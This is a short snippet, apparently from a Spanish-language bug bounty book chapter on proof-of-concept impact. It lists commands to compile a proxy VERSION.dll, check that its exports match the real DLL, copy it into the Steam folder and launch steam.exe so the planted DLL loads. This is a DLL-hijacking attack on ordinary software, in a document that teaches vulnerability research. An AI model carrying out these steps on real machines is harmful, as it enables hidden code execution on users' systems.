# Extraído de: LibroBugBounty/cap-17-poc-impacto.md
# Compilar
x86_64-w64-mingw32-gcc -shared -o VERSION.dll version_proxy.c -lkernel32

# Verificar exports (deben coincidir con la DLL real)
python -c "import pefile; pe=pefile.PE('VERSION.dll'); \
  [print(e.name.decode()) for e in pe.DIRECTORY_ENTRY_EXPORT.symbols]; \
  pe.close()"

# Desplegar en directorio de Steam
copy VERSION.dll "C:\Program Files (x86)\Steam\VERSION.dll"

# Ejecutar steam.exe — VERSION.dll proxy se carga automáticamente
